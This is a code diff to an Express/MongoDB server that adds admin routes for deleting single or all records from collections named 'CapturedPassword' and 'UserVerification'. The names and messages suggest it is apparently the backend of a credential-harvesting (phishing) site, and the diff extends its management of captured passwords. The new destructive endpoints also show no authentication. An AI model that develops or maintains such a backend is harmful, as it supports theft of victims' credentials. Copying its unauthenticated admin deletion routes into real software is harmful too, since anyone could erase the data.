@@ -13,7 +13,6 @@ app.use(express.static(path.join(__dirname, 'public')));
 app.use('/uploads', express.static(path.join(__dirname, 'uploads')));
 
 // --- Connect to MongoDB Atlas ---
-// DEPRECATED OPTIONS REMOVED FOR CLEANER LOGS
 mongoose.connect(process.env.MONGODB_URI)
 .then(() => {
     console.log('Successfully connected to MongoDB Atlas');
@@ -108,6 +107,44 @@ app.get('/admin/verifications', async (req, res) => {
     }
 });
 
+// --- NEW: Delete Routes ---
+app.delete('/admin/delete-password/:id', async (req, res) => {
+    try {
+        await CapturedPassword.findByIdAndDelete(req.params.id);
+        res.json({ success: true, message: 'Password entry deleted' });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to delete entry' });
+    }
+});
+
+app.delete('/admin/delete-verification/:id', async (req, res) => {
+    try {
+        await UserVerification.findByIdAndDelete(req.params.id);
+        res.json({ success: true, message: 'Verification entry deleted' });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to delete entry' });
+    }
+});
+
+app.delete('/admin/clear-passwords', async (req, res) => {
+    try {
+        await CapturedPassword.deleteMany({});
+        res.json({ success: true, message: 'All password entries cleared' });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to clear data' });
+    }
+});
+
+app.delete('/admin/clear-verifications', async (req, res) => {
+    try {
+        await UserVerification.deleteMany({});
+        res.json({ success: true, message: 'All verification entries cleared' });
+    } catch (error) {
+        res.status(500).json({ error: 'Failed to clear data' });
+    }
+});
+
+
 // --- Serve Frontend Files ---
 app.get('/admin', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'admin.html'));
@@ -116,6 +153,7 @@ app.get('/admin', (req, res) => {
 app.get('*', (req, res) => {
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
+
 
 app.listen(port, () => {
     console.log(`Server is running on port ${port}`);
